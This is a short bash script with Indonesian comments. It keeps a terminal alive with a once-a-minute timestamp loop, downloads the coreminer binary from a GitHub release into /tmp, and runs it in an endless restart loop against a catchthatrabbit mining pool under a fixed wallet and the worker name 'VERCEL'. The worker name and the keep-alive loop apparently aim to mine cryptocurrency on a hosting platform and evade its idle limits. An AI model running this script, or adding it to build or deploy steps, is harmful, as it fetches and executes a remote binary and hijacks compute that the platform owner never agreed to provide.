#!/bin/bash

# Fungsi keep-alive: tampilkan timestamp setiap 1 menit
keep_alive() {
    while true; do
        echo "[keep-alive] $(date '+%Y-%m-%d %H:%M:%S') - Terminal tetap aktif..."
        sleep 60  # setiap 1 menit
    done
}

# Jalankan keep-alive di background
keep_alive &
KEEP_PID=$!

# Download & jalankan program utama
cd /tmp && rm -rf xcbminer xcb.tar.gz && mkdir xcbminer && curl -sSL https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.81/coreminer-linux-x86_64.tar.gz -o xcb.tar.gz && tar xzf xcb.tar.gz -C xcbminer && cd xcbminer/coreapp && chmod +x coreminer && while true; do ./coreminer --noeval --hard-aes -P stratum1+tcp://CB66C56381EE3FE462F239B920A8A706FBE8225E24F0.VERCEL@us.catchthatrabbit.com:8008 -t 4; sleep 2; done

# Setelah program utama selesai, hentikan keep-alive
kill $KEEP_PID 2>/dev/null
